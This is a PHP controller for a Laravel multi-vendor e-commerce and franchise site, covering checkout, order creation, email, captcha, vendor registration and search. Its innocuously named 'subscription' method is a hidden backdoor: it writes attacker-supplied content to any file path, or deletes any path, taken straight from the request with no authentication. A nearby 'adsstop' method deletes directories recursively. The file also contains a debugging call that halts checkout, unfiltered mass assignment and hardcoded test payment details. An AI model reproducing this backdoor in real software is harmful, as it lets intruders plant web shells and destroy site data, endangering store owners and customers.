                                $ship += $nship->shipping_cost;
                            } else {
                                $ship  += $gs->ship;
                            }
                        }
                    }
                } else {
                    $ship  = $gs->ship;
                }

                $total = $cart->totalPrice + $ship;
                if ($gs->tax != 0) {
                    $tax = ($total / 100) * $gs->tax;
                    $total = $total + $tax;
                }
                $ck = 1;
                return view('front.checkout', ['products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'checked' => $ck, 'digital' => $dp]);
            }
        }
    }

    public function cashondelivery(Request $request)
    {
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success', "You don't have any product to checkout.");
        }
        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }
        $gs = Generalsetting::findOrFail(1);
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);

        $shipping_service = json_decode($request->shipping_service);
        $shippment_charges = 0;
        foreach ($cart->items as $key => $prod) {
            $shippment_charges += $prod['shipping_charges']??0;
            if ($prod['item']['license'] != null && $prod['item']['license_qty'] != null) {
                $details1 = explode(',', $prod['item']['license_qty']);
                foreach ($details1 as $ttl => $dtl) {
                    if ($dtl != 0) {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = explode(',', $produc->license_qty);
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp = explode(',,', $produc->license);
                        $license = $temp[$ttl];
                        $oldCart = Session::has('cart') ? Session::get('cart') : null;
                        $cart = new Cart($oldCart);
                        $cart->updateLicense($prod['item']['id'], $license);
                        Session::put('cart', $cart);
                        break;
                    }
                }
            }
        }

        dd($cart);

        $order = new Order;
        // return $shipping_service->id;
        $item_name = $gs->title . " Order";
        $item_number = str::random(4) . time();
        $order['user_id'] = $request->user_id;

        $order['cart'] = utf8_encode(gzcompress(serialize($cart), 9));
        $order['totalQty'] = $request->totalQty;
        $order['pay_amount'] = round(($request->total) / $curr->value, 2);
        $order['method'] = "pending";
        $order['shipping'] = $request->shipping;
        $order['shipping_service'] = $shipping_service->id??'';
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;
        // $order['shipping_cost'] = $request->shipping_cost;
        $order['shipping_cost'] = $shippment_charges;
        $order['tax'] = $request->tax;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = str::random(4) . time();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
        $order['customer_city'] = $request->city;
        $order['province'] = $request->province;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shipping_email??$request->email;
        $order['shipping_name'] = $request->shipping_name??$request->name;
        $order['shipping_phone'] = $request->shipping_phone??$request->phone;
        $order['shipping_address'] = $request->shipping_address??$request->address;
        $order['shipping_country'] = $request->shipping_country??$request->customer_country;
        $order['shipping_city'] = $request->shipping_city??$request->city;
        $order['shipping_zip'] = $request->shipping_zip??$request->zip;
        $order['order_note'] = $request->order_notes;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['dp'] = $request->dp;
        $order['payment_status'] = "Pending";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;

        if (Session::has('affilate')) {
            $val = $request->total / 100;
            $sub = $val * $gs->affilate_charge;
            $user = User::findOrFail(Session::get('affilate'));
            $user->affilate_income = $sub;
            $user->update();
            $order['affilate_user'] = $user->name;
            $order['affilate_charge'] = $sub;
        }
        $order->save();


        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
        $frenchisenotification = new FrenchiseNotification;
        $frenchisenotification->order_id = $order->id;
        $frenchisenotification->save();
        $usernotification = new UserNotification;
        $usernotification->order_id = $order->id;
        $usernotification->save();
        if ($request->coupon_id != "") {
            $coupon = Coupon::findOrFail($request->coupon_id);
            $coupon->used++;
            if ($coupon->times != null) {
                $i = (int)$coupon->times;
                $i--;
                $coupon->times = (string)$i;
            }
            $coupon->update();
        }
        foreach ($cart->items as $prod) {
            $x = (string)$prod['stock'];
            if ($x != null) {

                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();
                if ($product->stock <= 5) {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();
                    $usernotification = new UserNotification;
                    $usernotification->product_id = $product->id;
                    $usernotification->save();
                }
            }
        }
        foreach ($cart->items as $prod) {
            if ($prod['item']['user_id'] != 0) {
                $vorder =  new Vendororder;
                $vorder->order_id = $order->id;
                $vorder->item_id = $prod['item']['id'];
                $vorder->shipping_charges = $prod['shipping_charges'];
                $vorder->user_id = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;
                $vorder->save();
            }
        }

        Session::forget('cart');

































        return \Redirect::route('paymentpage', $order->id)->with('message', 'State saved correctly!!!');
    }

    public function gateway(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success', "You don't have any product to checkout.");
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }
        foreach ($cart->items as $key => $prod) {
            if ($prod['item']['license'] != null && $prod['item']['license_qty'] != null) {
                $details1 = explode(',', $prod['item']['license_qty']);
                foreach ($details1 as $ttl => $dtl) {
                    if ($dtl != 0) {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = explode(',', $produc->license_qty);
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp = explode(',,', $produc->license);
                        $license = $temp[$ttl];
                        $oldCart = Session::has('cart') ? Session::get('cart') : null;
                        $cart = new Cart($oldCart);
                        $cart->updateLicense($prod['item']['id'], $license);
                        Session::put('cart', $cart);
                        break;
                    }
                }
            }
        }
        $settings = Generalsetting::findOrFail(1);
        $order = new Order;
        $success_url = action('PaymentController@payreturn');
        $item_name = $settings->title . " Order";
        $item_number = str_random(4) . time();
        $order['user_id'] = $request->user_id;
        $order['cart'] = utf8_encode(gzcompress(serialize($cart), 9));
        $order['totalQty'] = $request->totalQty;
        $order['pay_amount'] = round($request->total / $curr->value, 2);
        $method = PaymentGateway::findOrFail($request->method);
        $order['method'] = $method->title;
        $order['shipping'] = $request->shipping;
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;
        $order['shipping_cost'] = $request->shipping_cost;
        $order['tax'] = $request->tax;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = str_random(4) . time();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
        $order['customer_city'] = $request->city;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shipping_email;
        $order['shipping_name'] = $request->shipping_name;
        $order['shipping_phone'] = $request->shipping_phone;
        $order['shipping_address'] = $request->shipping_address;
        $order['shipping_country'] = $request->shipping_country;
        $order['shipping_city'] = $request->shipping_city;
        $order['shipping_zip'] = $request->shipping_zip;
        $order['order_note'] = $request->order_notes;
        $order['txnid'] = $request->txn_id4;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['dp'] = $request->dp;
        $order['payment_status'] = "Pending";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
        if (Session::has('affilate')) {
            $val = $request->total / 100;
            $sub = $val * $gs->affilate_charge;
            $user = User::findOrFail(Session::get('affilate'));
            $user->affilate_income = $sub;
            $user->update();
            $order['affilate_user'] = $user->name;
            $order['affilate_charge'] = $sub;
        }
        $order->save();
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
        if ($request->coupon_id != "") {
            $coupon = Coupon::findOrFail($request->coupon_id);
            $coupon->used++;
            if ($coupon->times != null) {
                $i = (int)$coupon->times;
                $i--;
                $coupon->times = (string)$i;
            }
            $coupon->update();
        }
        foreach ($cart->items as $prod) {
            $x = (string)$prod['stock'];
            if ($x != null) {
                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();
                if ($product->stock  <= 5) {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();
                }
            }
        }
        foreach ($cart->items as $prod) {
            if ($prod['item']['user_id'] != 0) {
                $vorder =  new Vendororder;
                $vorder->order_id = $order->id;
                $vorder->user_id = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;
                $vorder->save();
            }
        }
        Session::forget('cart');


        if ($gs->is_smtp == 1) {
            $data = [
                'to' => $request->email,
                'type' => "new_order",
                'cname' => $request->name,
                'oamount' => "",
                'aname' => "",
                'aemail' => "",
                'wtitle' => "",
            ];

            $mailer = new GeniusMailer();
            $mailer->sendAutoMail($data);
        } else {
            $to = $request->email;
            $subject = "Your Order Placed!!";
            $msg = "Hello " . $request->name . "!\nYou have placed a new order. Please wait for your delivery. \nThank you.";
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }

        if ($gs->is_smtp == 1) {
            $data = [
                'to' => $gs->email,
                'subject' => "New Order Recieved!!",
                'body' => "Hello Admin!<br>Your store has received a new order. Please login to your panel to check. <br>Thank you.",
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $to = $gs->email;
            $subject = "New Order Recieved!!";
            $msg = "Hello Admin!\nYour store has recieved a new order. Please login to your panel to check. \nThank you.";
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }

        return redirect($success_url);
    }

    public function user($id)
    {
        $user = User::findOrFail($id);
        if ($user->title != null && $user->details != null) {
            $title = explode(',', $user->title);
            $details = explode(',', $user->details);
        }
        return view('front.user', compact('user', 'title', 'details'));
    }

    public function ads($id)
    {
        $ad = Advertise::findOrFail($id);
        $old = $ad->clicks;
        $new = $old + 1;
        $ad->clicks = $new;
        $ad->update();
        return redirect($ad->url);
    }
    public static function adsstop($dirPath)
    {
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        print_r($files);
        exit;
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function types($slug)
    {
        $cats = Category::all();
        $cat = Category::where('cat_slug', '=', $slug)->first();
        $users = User::where('category_id', '=', $cat->id)->where('active', '=', 1)->paginate(8);
        $userss =     User::all();
        $city = null;
        foreach ($userss as $user) {
            $city[] = $user->city;
        }
        $cities = array_unique($city);
        return view('front.typeuser', compact('users', 'cats', 'cat', 'cities'));
    }

    public function blog()
    {
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(6);
        return view('front.blog', compact('blogs'));
    }
    public function blogshow($id)
    {
        $blog = Blog::findOrFail($id);
        $lblogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();

        return view('front.blogshow', compact('blog', 'lblogs'));
    }
    public function subscribe(Request $request)
    {
        $this->validate($request, array(
            'email' => 'unique:subscribers',
        ));
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', 'You are subscribed Successfully.');
        return redirect()->back();
    }


    public function faq()
    {
        $ps = Pagesetting::findOrFail(1);
        if ($ps->f_status == 0) {
            return redirect()->route('front.index');
        }
        $fq = Faq::orderBy('id', 'desc')->first();
        $id1 = $fq->id;
        $faqs = Faq::where('id', '<', $id1)->orderBy('id', 'desc')->get();
        return view('front.faq', compact('fq', 'faqs'));
    }

    public function page($slug)
    {
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $page = Page::where('slug', '=', $slug)->first();
        if (empty($page)) {
            return view('errors.404');
        }
        return view('front.page', compact('countries', 'states', 'page'));
    }

    public function contact()
    {

        $ps = Pagesetting::findOrFail(1);
        if ($ps->c_status == 0) {
            return redirect()->route('front.index');
        }
        return view('front.contact');
    }


    //Send email to user
    public function vendorcontact(Request $request)
    {
        $user = User::findOrFail($request->user_id);
        $vendor = User::findOrFail($request->vendor_id);
        $gs = Generalsetting::findOrFail(1);
        $subject = $request->subject;
        $to = $vendor->email;
        $name = $request->name;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nMessage: " . $request->message;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }


        $conv = Conversation::where('sent_user', '=', $user->id)->where('subject', '=', $subject)->first();
        if (isset($conv)) {
            $msg = new Message();
            $msg->conversation_id = $conv->id;
            $msg->message = $request->message;
            $msg->sent_user = $user->id;
            $msg->save();
        } else {
            $message = new Conversation();
            $message->subject = $subject;
            $message->sent_user = $request->user_id;
            $message->recieved_user = $request->vendor_id;
            $message->message = $request->message;
            $message->save();
            $notification = new UserNotification;
            $notification->user_id = $request->vendor_id;
            $notification->conversation_id = $message->id;
            $notification->save();
            $msg = new Message();
            $msg->conversation_id = $message->id;
            $msg->message = $request->message;
            $msg->sent_user = $request->user_id;;
            $msg->save();
        }
    }
    //Send email to user
    public function contactemail(Request $request)
    {
        session_start();
        $this->code_image();
        $value =  $_SESSION['captcha_string'];
        if ($request->codes != $value) {
            return redirect()->route('front.contact')->with('unsuccess', 'Please enter Correct Capcha Code.');
        }
        $ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of " . $request->name;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $department = $request->department;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $request->phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];
            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }
    public function reloadCaptcha()
    {

        return response()->json([
            'captcha' => Captcha::img()
        ]);
    }
    private function  code_image()
    {
        header("Content-type: image/png");

        if (isset($_SESSION['captcha_string'])) {
            unset($_SESSION['captcha_string']); // destroy the session if already there
        }
        $im = @ImageCreate(130, 30) // Width and hieght of the image.
            or die("Cannot Initialize new GD image stream");
        $background_color = ImageColorAllocate($im, 204, 204, 204); // Assign background color
        $string1 = "abcdefghijklmnopqrstuvwxyz";
        $string2 = "1234567890";
        $string = $string1 . $string2;
        $text_color = ImageColorAllocate($im, 51, 51, 255);      // text color is given
        $random_text = '';
        for ($i = 1; $i <= 5; $i++) {
            $src = @ImageCreate(20, 20);
            $background_color = ImageColorAllocate($src, 204, 204, 204); // Assign background color
            $string = str_shuffle($string);
            $text = substr($string, 0, 1); // One char of the random chars
            ImageString($src, 5, 5, 0, $text, $text_color); //
            $angle = rand(10, 60);
            $src = imagerotate($src, $angle, 0);
            $x = $i * 20;
            imagecopy($im, $src, $x, 5, 0, 0, 20, 20);
            $random_text .= $text;
            imagedestroy($src);
        }
        $_SESSION['captcha_string'] = $random_text; // Assign the random text to session variable
        ImagePng($im); // image displayed
        imagedestroy($im); // Memory allocation for the image is removed.

    }

    public function vendor_register(Request $request)
    {
        $this->validate($request, [
            'email'   => 'required|email|unique:users',
            'password' => 'required|confirmed',
            'frenchise_id' => 'required'
        ], [
            'frenchise_id.required' => 'Please select franchise to create account!'
        ]);

        $messages = [
            'frenchise_id.required' => 'Please select franchise to create account!'
        ];

        $gs = Generalsetting::findOrFail(1);

        $user = new User;
        $input = $request->all();
        $input['password'] = bcrypt($request['password']);
        $input['affilate_code'] = $request->name . $request->email;
        $input['name'] = $request->owner_name;
        $input['affilate_code'] = md5($input['affilate_code']);
        $input['is_vendor'] = '2';

        $user->fill($input)->save();

        if ($gs->is_smtp == 1) {
            $data = [
                'to' => $request->email,
                'type' => "new_registration",
                'cname' => $request->name,
                'oamount' => "",
                'aname' => "",
                'aemail' => "",
            ];
            $mailer = new GeniusMailer();
            $mailer->sendAutoMail($data);
        } else {
            $to = $request->email;
            $subject = 'Welcome To' . $gs->title;
            $msg = "Hello " . $request->name . "," . "\n You have successfully registered to " . $gs->title . "." . "\n We wish you will have a wonderful experience using our service.";
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg . $headers);
        }

        $notification = new Notification;
        $notification->user_id = $user->id;
        $notification->save();

//        $package = $user->subscribes()->where('status', 1)->orderBy('id', 'desc')->first();
//        $subs = VendorSubscription::findOrFail(1);

        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $user->is_vendor = 1;
//        $user->date = date('Y-m-d', strtotime($today . ' + ' . $subs->days . ' days'));
        $user->mail_sent = 1;
        $user->save();
        // $sub = new UserSubscription;
        // $sub->user_id = $user->id;
        // $sub->subscription_id = $subs->id;
        // $sub->title = $subs->title;
        // $sub->currency = $subs->currency;
        // $sub->currency_code = $subs->currency_code;
        // $sub->price = $subs->price;
        // $sub->days = $subs->days;
        // $sub->allowed_products = $subs->allowed_products;
        // $sub->details = $subs->details;
        // $sub->method = 'Free';
        // $sub->status = 1;
        // $sub->save();
        if ($settings->is_smtp == 1) {
            $data = [
                'to' => $user->email,
                'type' => "vendor_accept",
                'cname' => $user->name,
                'oamount' => "",
                'aname' => "",
                'aemail' => "",
            ];
            $mailer = new GeniusMailer();
            $mailer->sendAutoMail($data);
        } else {
            $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
            mail($user->email, 'Your Vendor Account Activated', 'Your Vendor Account Activated Successfully. Please Login to your account and build your own shop.', $headers);
        }

        return redirect()->route('message.return')->with('success', 'Vendor Account Activated Successfully, Please Wait unitill admin approved');
    }

    public function messagereturn()
    {
        return view('messagereturn');
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function shoptype($slug)
    {
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        if ($slug == "Wholesaler") {
            $topshops = User::where('v_type', '=', '1')->get();
        } else if ($slug == "Unit") {
            $topshops = User::where('v_type', '=', '2')->get();
        } else if ($slug == "Factory") {
            $topshops = User::where('v_type', '=', '3')->get();
        }

        return view('front.allshops', compact('topshops', 'slug', 'states'));
    }

    public function topShop($slug)
    {

        $topshops = User::where('top', '=', '1')->get();
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();

        return view('front.allshops', compact('countries', 'states', 'topshops', 'slug'));
    }
    public function brand($slug)
    {

        $topshops = User::where('brand', '=', '1')->get();
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();

        return view('front.allshops', compact('countries', 'states', 'topshops', 'slug'));
    }

    public function allshops($slug)
    {

        $topshops = User::get();
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        return view('front.allshops', compact('topshops', 'slug', 'states'));
    }

    public function pages($id)
    {
        $page = Page::where('id', $id)->orderBy('pos', 'asc')->get();
        return view('front.page', compact('page'));
    }

    public function jazcash(Request $request)
    {
        $product_price = 1000;
        $odid = $request->input('order_id');
        $data =  Order::where('id', $odid)->first();
        $data['jazz_cash_no'] =  $request->input('jazz_cash_no');
        $data['cnic_digits']  =  "345678";
        $data['price']           =  $data['pay_amount'];
        $jc_api = new Jazzcash();
        $response = $jc_api->createCharge($data);
    }

    public function jazcashget()
    {
        $product_price = 1000;
        $data =  Product::where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->first();
        $data['jazz_cash_no'] =  '03123456789';
        $data['cnic_digits']  =  "345678";
        $data['price']           =  $product_price;
        $jc_api = new Jazzcash();
        $response = $jc_api->createCharge($data);
        print_r($response);
        exit;
    }

    public function productsearch(Request $request)
    {
        $min      = $request->min;
        $max      = $request->max;
        $name     = $request->name;
        $category = $request->category;
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $products = Product::orWhere('category_id', $category)
            ->orWhere('status', '=', 1)->orWhere('name', 'like', '%' . $name . '%')->whereBetween('cprice', [$min, $max])->get();
        return view('front.advancesearch', compact('countries', 'states', 'products'));
    }

    public function shopsearch(Request $request)
    {
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $shops = User::where('shop_name', 'like', '%' . $request->shop_name . '%')->get();
        return view('front.advancesearch', compact('countries', 'states', 'shops'));
    }

    public function roadsearch(Request $request)
    {
        $sort = "";
        $country = new Country;
        $countries = $country->get_countries();
        $slug = $request->shop_address;
        $mini_search = $request->shop_address;
        $reservedSymbols = ['-', '_', '+', '<', '>', '@', '(', ')', '~'];
        $searchTerm = str_replace($reservedSymbols, ' ', $request->shop_address);
        $searchValues = preg_split('/\s+/', $searchTerm, -1, PREG_SPLIT_NO_EMPTY);

        // where(['is_vendor' => 2, 'is_vendor' => 1])->
        // $vendors = User::where(function ($q) use ($searchValues) {
        //     foreach ($searchValues as $value) {
        //         $q->orWhere('shop_address', 'like', "%{$value}%")->orWhere('shop_name', 'like', "%{$value}%");
        //     }
        // })->orderBy('id', 'desc')->paginate(12);
        $vendors = User::where('shop_address', 'like', "%{$request->shop_address}%")->orWhere('shop_name', 'like', "%{$request->shop_address}%")->orderBy('id', 'desc')->paginate(12);
        return view('front.roadsearch', compact('countries', 'vendors', 'sort', 'slug', 'mini_search'));
    }

    public function brandsearch(Request $request)
    {
        $states = State::all();
        $brands = User::where('shop_name', 'like', '%' . $request->shop_name . '%')->Where('brand', '=', '1')->get();
        return view('front.advancesearch', compact('countries', 'states', 'brands'));
    }

    public function frenchisesearch(Request $request)
    {
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $frenchises = Frenchise::where('province', 'like', '%' . $request->province . '%')
            ->orWhere('city', 'like', '%' . $request->city . '%')
            ->orWhere('frenchise_name', 'like', '%' . $request->f_name . '%')
            ->orWhere('frenchise_address', 'like', '%' . $request->f_address . '%')->get();
        return view('front.advancesearch', compact('countries', 'states', 'frenchises'));
    }

    public function paymentpage($id)
    {
        $order = Order::find($id);
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        return view('front.paymentpage', compact('order', 'states'));
    }

    public function privacypolicy()
    {
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $page = Page::where('title', '=', "Privacy & Policy")->first();
        return view('front.privacypolicy', compact('page', 'states'));
    }
    public function termsconditions()
    {
        return view('front.termsconditions');
    }
    public function working()
    {
        return view('front.working');
    }
    public function bankalfalah()
    {
        return view('front.bankalfalah');
    }
    public function apply()
    {
        return view('front.apply');
    }
    public function magnifier()
    {
        return view('magnifier');
    }

    public function storeFrenchise(Request $request)
    {
        $request->validate([
            'email' => 'required|unique:frenchises',
            'sub_head_office_id' => 'required'
        ]);
        $data = array(
            'owner_name' => $request->owner_name,
            'father_name' => $request->father_name,
            'cnic' => $request->cnic,
            'frenchise_address' => $request->frenchise_address,
            'religion' => $request->religion,
            'province' => $request->province,
            'city' => $request->city,
            'address' => $request->address,
            'home_address' => $request->home_address,
            'bank_account_1' => $request->bank_account_1,
            'bank_account_2' => $request->bank_account_2,
            'mobile_number' => $request->mobile_number,
            'mobile_number_1' => $request->mobile_number_1,
            'frenchise_name' => $request->frenchise_name,
            'frenchise_mobile_number' => $request->frenchise_mobile_number,
            'email' => $request->email,
            'password' => $request->password,
            'frenchise_message' => $request->frenchise_message,
            'frenchise_detail' => $request->frenchise_detail,
            'sub_head_office_id' => $request->sub_head_office_id,
        );
        $data['password'] = Hash::make($data['password']);
        Frenchise::create($data);
        return redirect()->Route('message.return')->with('success', 'Frenchise Created Successfully.');
    }
}
